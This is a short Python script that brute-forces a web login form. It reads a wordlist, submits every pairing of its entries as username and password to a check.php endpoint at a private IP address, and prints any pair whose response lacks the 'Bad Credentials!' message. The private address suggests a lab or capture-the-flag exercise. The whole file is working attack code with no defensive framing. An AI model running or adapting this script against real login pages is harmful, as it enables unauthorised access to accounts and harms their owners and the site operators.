import requests
import sys
lines = []

with open(sys.argv[1], 'r') as wordlist:
    lines = wordlist.readlines()

s = requests.Session()

for i in lines:
    for j in lines:
        mydata = {
            'login_field': i.replace("\n", ""),
            'cred_field': j.replace("\n", "")
        }

        response = s.post('http://172.25.0.32/check.php', data=mydata)

        currentPageText = response.text

        if "Bad Credentials!" not in currentPageText:
            print(currentPageText, "\n\n", "username:", i, "\npassword:", j)
        